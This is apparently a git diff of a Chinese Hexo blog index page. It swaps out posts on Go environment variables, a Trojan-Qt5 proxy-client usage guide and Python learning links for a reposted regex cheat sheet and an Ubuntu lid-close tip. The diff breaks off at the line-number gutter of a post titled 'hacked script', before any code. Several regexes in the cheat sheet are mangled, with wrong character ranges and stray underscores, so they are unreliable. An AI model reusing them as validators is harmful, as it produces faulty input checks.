-<p>在接下来的章节中，我们将会讨论如何在 Linux、Mac OS X 和 Windows 上安装 Go 语言。在 FreeBSD 上的安装和 Linux 非常类似。开发团队正在尝试将 Go 语言移植到其它例如 OpenBSD、DragonFlyBSD、NetBSD、Plan 9、Haiku 和 Solaris 操作系统上，你可以在这个页面找到最近的动态：<a target="_blank" rel="noopener" href="http://go-lang.cat-v.org/os-ports">Go Porting Efforts</a>。</p>
-<p><code>GOPROXY</code><br>设置代理服务器，可以设置多个代理服务器以及 direct，比如<a target="_blank" rel="noopener" href="https://goproxy.cn,direct/">https://goproxy.cn,direct</a></p>
-<p><code>GOSUMDB</code><br>用来校验你下载的库的 hash 是否==官方的 hash 一样。</p>
-<p><code>GOPRIVATE</code><br>设置不使用代理的人下限为，比如一些公司内部的仓库等，如<code>GOPRIVATE=*.corp.example.com,rsc.io/private</code>。<br>作为和之前的兼容，还保留着 <code>GONOPROXY</code> 功能与 <code>GOPRIVATE</code> 一样。</p>
-<p>go help module-auth 了解 GOSUMDB 和 GONOSUMDB 变量<br>go help goproxy 了解 proxy 的通讯协议<br>go help modules 了解 module 的功能。<br>go help module-get 了解 go get 命令的变化。<br>go help gopath-get 显示先前的基于 GOPATH 的 go get 功能。<br>go help module-private 了解私有库的设置</p>
+<hr>
+<h2 id="三、特殊需求表达式"><a href="#三、特殊需求表达式" class="headerlink" title="三、特殊需求表达式"></a>三、特殊需求表达式</h2><ul>
+<li>Email 地址：<strong>^\w+([-+.]\w+)_@\w+([-.]\w+)_.\w+([-.]\w+)*$</strong></li>
+<li>域名：**[a-zA-Z0-9][-a-za-z0-9]{0,62}(.[a-zA-Z0-9][-a-za-z0-9]{0,62})+.?**</li>
+<li>InternetURL：**[a-zA-z]+://[^\s]_ 或 ^http://([\w-]+.)+[\w-]+(/[\w-./?%&amp;=]_)?$**</li>
+<li>手机号码：<strong>^(13[0-9]|14[5|7]|15[0|1|2|3|4|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$</strong></li>
+<li>电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX)：<strong>^((\d{3,4}-)|\d{3.4}-)?\d{7,8}$</strong></li>
+<li>国内电话号码(0511-4405222、021-87888822)：<strong>\d{3}-\d{8}|\d{4}-\d{7}</strong></li>
+<li>电话号码正则表达式（支持手机号码，3-4 位区号，7-8 位直播号码，1－4 位分机号）: <strong>((\d{11})|^((\d{7,8})|(\d{4}|\d{3})-(\d{7,8})|(\d{4}|\d{3})-(\d{7,8})-(\d{4}|\d{3}|\d{2}|\d{1})|(\d{7,8})-(\d{4}|\d{3}|\d{2}|\d{1}))$)</strong></li>
+<li>身份证号(15 位、18 位数字)，最后一位是校验位，可能为数字或字符 X：**(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)**</li>
+<li>帐号是否合法(字母开头，允许 5-16 字节，允许字母数字下划线)：<strong>^[a-zA-Z][a-za-z0-9_]{4,15}$</strong></li>
+<li>密码(以字母开头，长度在 6~18 之间，只能包含字母、数字和下划线)：<strong>^[a-zA-Z]\w{5,17}$</strong></li>
+<li>强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 8-10 之间)：<strong>^(?=.<em>\d)(?=.</em>[a-z])(?=.*[A-Z])[a-zA-Z0-9]{8,10}$</strong></li>
+<li>强密码(必须包含大小写字母和数字的组合，可以使用特殊字符，长度在 8-10 之间)：<strong>^(?=.<em>\d)(?=.</em>[a-z])(?=.*[A-Z]).{8,10}$</strong></li>
+<li>日期格式：<strong>^\d{4}-\d{1,2}-\d{1,2}</strong></li>
+<li>一年的 12 个月(01 ～ 09 和 1 ～ 12)：<strong>^(0?[1-9]|1[0-2])$</strong></li>
+<li>一个月的 31 天(01 ～ 09 和 1 ～ 31)：<strong>^((0?[1-9])|((1|2)[0-9])|30|31)$</strong></li>
+<li>钱的输入格式：<ol>
+<li> 有四种钱的表示形式我们可以接受:”10000.00” 和 “10,000.00”, 和没有 “分” 的 “10000” 和 “10,000”：<strong>^[1-9][0-9]*$</strong></li>
+<li> 这表示任意一个不以 0 开头的数字,但是,这也意味着一个字符”0”不通过,所以我们采用下面的形式：<strong>^(0|[1-9][0-9]*)$</strong></li>
+<li> 一个 0 或者一个不以 0 开头的数字.我们还可以允许开头有一个负号：<strong>^(0|-?[1-9][0-9]*)$</strong></li>
+<li> 这表示一个 0 或者一个可能为负的开头不为 0 的数字.让用户以 0 开头好了.把负号的也去掉,因为钱总不能是负的吧。下面我们要加的是说明可能的小数部分：<strong>^[0-9]+(.[0-9]+)?$</strong></li>
+<li> 必须说明的是,小数点后面至少应该有 1 位数,所以”10.”是不通过的,但是 “10” 和 “10.2” 是通过的：<strong>^[0-9]+(.[0-9]{2})?$</strong></li>
+<li> 这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：<strong>^[0-9]+(.[0-9]{1,2})?$</strong></li>
+<li> 这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：<strong>^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$</strong></li>
+<li> 1 到 3 个数字,后面跟着任意个 逗号+3 个数字,逗号成为可选,而不是必须：<strong>^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$</strong></li>
+<li> 备注：这就是最终结果了,别忘了”+”可以用”*“替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里</li>
+</ol>
+</li>
+<li>xml 文件：<strong>^([a-zA-Z]+-?)+[a-zA-Z0-9]+\.[x|X][m|m][l|L]$</strong></li>
+<li>中文字符的正则表达式：**[\u4e00-\u9fa5]**</li>
+<li>双字节字符：**[^\x00-\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计 2，ASCII 字符计 1))**</li>
+<li>空白行的正则表达式：<strong>\n\s*\r (可以用来删除空白行)</strong></li>
+<li>HTML 标记的正则表达式：*<em>&lt;(\S*?)[^&gt;]</em>&gt;._?|&lt;._? /&gt; ( 首尾空白字符的正则表达式：^\s*|\s*$或(^\s*)|(\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)**</li>
+<li>腾讯 QQ 号：**[1-9][0-9]{4,} (腾讯 QQ 号从 10000 开始)**</li>
+<li>中国邮政编码：**[1-9]\d{5}(?!\d) (中国邮政编码为 6 位数字)**</li>
+<li>IPv4 地址：**((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}**</li>
+</ul>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://deerchao.cn/tutorials/regex/regex.htm">https://deerchao.cn/tutorials/regex/regex.htm</a> 30 分钟玩明白正则<br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903845227659271">https://juejin.cn/post/6844903845227659271</a> 正则表达式不要背<br>​</p>
 
       
 
@@ -745,7 +1181,7 @@ var _hmt = _hmt || [];
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/15/yuque/Go%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/07/29/yuque/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E8%BD%AC%E8%BD%BD%E8%9E%8D%E5%90%88%EF%BC%89/">展开全文 >></a>
         </p>
       
 
@@ -775,38 +1211,33 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-yuque/特洛伊使用说明" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-yuque/linux系统（Ubuntu）之合上笔记本盖但不断网" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/03/yuque/%E7%89%B9%E6%B4%9B%E4%BC%8A%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">特洛伊使用说明</a>
+      <a class="article-title" href="/2021/06/28/yuque/linux%E7%B3%BB%E7%BB%9F%EF%BC%88Ubuntu%EF%BC%89%E4%B9%8B%E5%90%88%E4%B8%8A%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%9B%96%E4%BD%86%E4%B8%8D%E6%96%AD%E7%BD%91/">linux系统（Ubuntu）之合上笔记本盖但不断网</a>
     </h1>
   
 
         
-        <a href="/2021/01/03/yuque/%E7%89%B9%E6%B4%9B%E4%BC%8A%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" class="archive-article-date">
-  	<time datetime="2021-01-03T13:13:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-03</time>
+        <a href="/2021/06/28/yuque/linux%E7%B3%BB%E7%BB%9F%EF%BC%88Ubuntu%EF%BC%89%E4%B9%8B%E5%90%88%E4%B8%8A%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%9B%96%E4%BD%86%E4%B8%8D%E6%96%AD%E7%BD%91/" class="archive-article-date">
+  	<time datetime="2021-06-28T05:21:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-28</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h1><p>下载代理软件 <a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/7z/190217/1609680002840-384fab53-a5e4-48d5-94e1-04702f0b01ec.7z?_lake_card=%7B%22uid%22:%221609679990619-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/7z/190217/1609680002840-384fab53-a5e4-48d5-94e1-04702f0b01ec.7z%22,%22name%22:%22Trojan-Qt5-Windows.7z%22,%22size%22:23724484,%22type%22:%22%22,%22ext%22:%227z%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22AD6cQ%22,%22card%22:%22file%22%7D">Trojan-Qt5-Windows.7z</a><br>如果 windows 提示打不开 下载解压缩 <a target="_blank" rel="noopener" href="http://www.winrar.com.cn/">http://www.winrar.com.cn/</a> 软件即可</p>
-<p>macos <a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/dmg/190217/1611543072025-ca55e697-6187-4f68-a54e-2f07b0d0c4ff.dmg?_lake_card=%7B%22uid%22:%221611542907886-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/dmg/190217/1611543072025-ca55e697-6187-4f68-a54e-2f07b0d0c4ff.dmg%22,%22name%22:%22Trojan-Qt5-macOS+(1).dmg%22,%22size%22:39300693,%22type%22:%22%22,%22ext%22:%22dmg%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%225frYR%22,%22card%22:%22file%22%7D">Trojan-Qt5-macOS (1).dmg</a></p>
-<p>ios 使用软件(需要非中国大陆 apple id)，否则打开白屏幕：<a target="_blank" rel="noopener" href="https://apps.apple.com/us/app/shadowlink-shadowsocks-tool/id1439686518">https://apps.apple.com/us/app/shadowlink-shadowsocks-tool/id1439686518</a></p>
-<h1 id="解释说明"><a href="#解释说明" class="headerlink" title="解释说明"></a>解释说明</h1><p>PAC 代理：为防火墙智能代理，会自动过滤 中国大陆以内的 ip 地址数据包。 （国内非 T 子，访问国外为 T 子）<br>全局代理：为全局 T 子 如果采用这个模式，中国大陆某些视频网站会提示你版权出现问题或者访问国内网站特别慢的情况发生</p>
-<h1 id="ios-端"><a href="#ios-端" class="headerlink" title="ios 端"></a>ios 端</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/bsgts7?_lake_card=%7B%22status%22:%22uploaded%22,%22name%22:%22RPReplay_Final1613837361.MP4%22,%22size%22:123451548,%22percent%22:100,%22taskId%22:%2243bbwmUvodwp%22,%22margin%22:true,%22id%22:%22kacxw%22,%22videoId%22:%22inputs/prod/yuque/2021/190217/MP4/1613838724900-8252848e-cd46-4e23-a92f-238cf1323c43.MP4%22,%22card%22:%22video%22%7D#kacxw"><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="RPReplay_Final1613837361.MP4 (117.73MB)"></a></p>
-<h1 id="windows-端"><a href="#windows-端" class="headerlink" title="windows 端"></a>windows 端</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/bsgts7?_lake_card=%7B%22status%22:%22done%22,%22name%22:%22%E5%AE%89%E8%A3%85.mp4%22,%22size%22:3165670,%22percent%22:100,%22taskId%22:%22IYh5Ld4rMzks%22,%22margin%22:true,%22id%22:%22oXemB%22,%22videoId%22:%22inputs/prod/yuque/2021/190217/mp4/1609680841234-7c5d380b-0a94-4b7b-a6ec-57ce0811cf0f.mp4%22,%22card%22:%22video%22%7D#oXemB"><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="安装.mp4 (3.02MB)"></a></p>
-<h2 id="windows-使用"><a href="#windows-使用" class="headerlink" title="windows 使用"></a>windows 使用</h2><p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/bsgts7?_lake_card=%7B%22status%22:%22done%22,%22name%22:%22%E4%BD%BF%E7%94%A8.mp4%22,%22size%22:2699578,%22percent%22:100,%22taskId%22:%22gtUbrKF5RI6Z%22,%22margin%22:true,%22id%22:%222TKQD%22,%22videoId%22:%22inputs/prod/yuque/2021/190217/mp4/1609681118723-5929eda8-e0e0-472b-953d-461d836386cb.mp4%22,%22card%22:%22video%22%7D#2TKQD"><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="使用.mp4 (2.57MB)"></a></p>
-<h1 id="MacOS-使用"><a href="#MacOS-使用" class="headerlink" title="MacOS 使用"></a>MacOS 使用</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/bsgts7?_lake_card=%7B%22status%22:%22done%22,%22name%22:%22tro.mp4%22,%22size%22:105906344,%22percent%22:100,%22taskId%22:%22jtcGxLWC2rzM%22,%22margin%22:true,%22id%22:%22dkdJr%22,%22videoId%22:%22inputs/prod/yuque/2021/190217/mp4/1611553175119-214606d4-c00e-4dd5-98a2-5407cdafe5e8.mp4%22,%22card%22:%22video%22%7D#dkdJr"><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="tro.mp4 (101MB)"></a></p>
-<h1 id="正常使用状态"><a href="#正常使用状态" class="headerlink" title="正常使用状态"></a>正常使用状态</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1611552878301-bcfa22f2-f08a-44ed-bd17-d71f6481e47d.png#align=left&display=inline&height=86&margin=%5Bobject%20Object%5D&name=image.png&originHeight=86&originWidth=145&size=12770&status=done&style=none&width=145" alt="image.png"><br>蓝色小马 上面带个 G 全局代理</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1611552920679-2cb4cf23-df72-47ea-a52f-d93d57ff0bf4.png#align=left&display=inline&height=44&margin=%5Bobject%20Object%5D&name=image.png&originHeight=44&originWidth=76&size=6568&status=done&style=none&width=76" alt="image.png"><br>绿色小马 上面带个 P 国外代理 误伤概率比较高<br><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1611553009805-f6d8cec9-72ce-4790-8935-cb2f43197e61.png#align=left&display=inline&height=343&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-25%2013.36.41.png&originHeight=343&originWidth=494&size=192789&status=done&style=none&width=494" alt="截屏2021-01-25 13.36.41.png"></p>
-<h1 id="使用注意："><a href="#使用注意：" class="headerlink" title="使用注意："></a>使用注意：</h1><p>访问外 wang<br><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1609681415544-d2aba294-f93f-4ac0-b7f4-5b043df99b2f.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&name=image.png&originHeight=742&originWidth=712&size=358619&status=done&style=none&width=356" alt="image.png"></p>
-<p>内网访问不了，请关闭该软件</p>
+        <p>配置场景：ubuntu 电脑作为服务器，开机后把盖合上，省的屏幕亮。刚开始一盖上电脑盖电脑就断开网络，导致其他客户端电脑无法访问服务器。修改配置方法如下：</p>
+<p>编辑下列文件：/etc/systemd/logind.conf</p>
+<p>#HandlePowerKey 按下电源键后的行为，默认 power off</p>
+<p>#HandleSleepKey 按下挂起键后的行为，默认 suspend</p>
+<p>#HandleHibernateKey 按下休眠键后的行为，默认 hibernate</p>
+<p>#HandleLidSwitch 合上笔记本盖后的行为，默认 suspend（改为 lock；即合盖不休眠）在原文件中，还要去掉前面的#</p>
+<p>运行：systemctl restart systemd-logind 就会生效。</p>
 
       
 
@@ -819,329 +1250,7 @@ var _hmt = _hmt || [];
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/03/yuque/%E7%89%B9%E6%B4%9B%E4%BC%8A%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/pip!pip3 包下载加速" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/06/yuque/pip!pip3%20%E5%8C%85%E4%B8%8B%E8%BD%BD%E5%8A%A0%E9%80%9F/">pip/pip3 包下载加速</a>
-    </h1>
-  
-
-        
-        <a href="/2020/12/06/yuque/pip!pip3%20%E5%8C%85%E4%B8%8B%E8%BD%BD%E5%8A%A0%E9%80%9F/" class="archive-article-date">
-  	<time datetime="2020-12-06T10:17:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>macos/linux 解决方案：<a target="_blank" rel="noopener" href="https://blog.csdn.net/kwame211/article/details/95984293">https://blog.csdn.net/kwame211/article/details/95984293</a><br>windows 解决方案：<a target="_blank" rel="noopener" href="https://www.jb51.net/article/177874.htm">https://www.jb51.net/article/177874.htm</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/06/yuque/pip!pip3%20%E5%8C%85%E4%B8%8B%E8%BD%BD%E5%8A%A0%E9%80%9F/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/python学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/06/yuque/python%E5%AD%A6%E4%B9%A0/">python学习</a>
-    </h1>
-  
-
-        
-        <a href="/2020/12/06/yuque/python%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2020-12-06T10:04:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>推荐课程和语法<br>语法：<a target="_blank" rel="noopener" href="https://www.runoob.com/python3/python3-tutorial.html">https://www.runoob.com/python3/python3-tutorial.html</a></p>
-<p>课程<br>爬虫、编程功能：<br>     爬虫：链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GoGn15uxhY0zDBJxHemyCA">https://pan.baidu.com/s/1GoGn15uxhY0zDBJxHemyCA</a> 提取码: jv3y<br>  编程入门：<a target="_blank" rel="noopener" href="https://edu.aliyun.com/course/explore?title=python">https://edu.aliyun.com/course/explore?title=python</a><br>AI 教程：<br>吴恩达（比较有名的，讲的比较好） ：<br><a target="_blank" rel="noopener" href="https://study.163.com/course/introduction/1210076550.htm">https://study.163.com/course/introduction/1210076550.htm</a> （中文）                     <br><a target="_blank" rel="noopener" href="https://www.coursera.org/learn/ai-for-everyone">https://www.coursera.org/learn/ai-for-everyone</a>（英文）</p>
-<p>数据分析：<br>百度云盘 链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GoGn15uxhY0zDBJxHemyCA">https://pan.baidu.com/s/1GoGn15uxhY0zDBJxHemyCA</a> 提取码: jv3y （分两次保存到自己的百度云盘）<br>网易云课堂：<a target="_blank" rel="noopener" href="https://course.study.163.com/400000002639002">数据分析师（python）</a>如果需要网易云的课程账号跟课可以私我账号密码</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/06/yuque/python%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/python编程IDE" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/06/yuque/python%E7%BC%96%E7%A8%8BIDE/">python编程IDE</a>
-    </h1>
-  
-
-        
-        <a href="/2020/12/06/yuque/python%E7%BC%96%E7%A8%8BIDE/" class="archive-article-date">
-  	<time datetime="2020-12-06T10:03:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>编程需要好的 IDE 来支持。</p>
-<p>技术编程推荐 pycharm<br>下载地址：<a target="_blank" rel="noopener" href="https://www.jetbrains.com/pycharm/">https://www.jetbrains.com/pycharm/</a><br>windows 教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/pycharm-windows-install.html">https://www.runoob.com/w3cnote/pycharm-windows-install.html</a><br>macos 教程：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dc396a37ddee">https://www.jianshu.com/p/dc396a37ddee</a></p>
-<p>做数据分析推荐 jupyter notebook（可视化编程所见即所得）<br><a target="_blank" rel="noopener" href="https://jupyter.org/install">https://jupyter.org/install</a><br>教程：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/91365f343585">https://www.jianshu.com/p/91365f343585</a></p>
-<p>爱好者选择 vscode<br>微软大法下载地址：<a target="_blank" rel="noopener" href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/06/yuque/python%E7%BC%96%E7%A8%8BIDE/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/python环境准备" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/06/yuque/python%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/">python环境准备</a>
-    </h1>
-  
-
-        
-        <a href="/2020/12/06/yuque/python%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/" class="archive-article-date">
-  	<time datetime="2020-12-06T10:03:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>目前 python 存在 python2 与 python3 。（语法差异有点大）<br>python2 已经停止维护。<br>请按照 python3 安装。<br>安装教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/python/python-install.html">https://www.runoob.com/python/python-install.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/06/yuque/python%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/被黑脚本" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/28/yuque/%E8%A2%AB%E9%BB%91%E8%84%9A%E6%9C%AC/">被黑脚本</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/28/yuque/%E8%A2%AB%E9%BB%91%E8%84%9A%E6%9C%AC/" class="archive-article-date">
-  	<time datetime="2020-09-28T16:57:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span 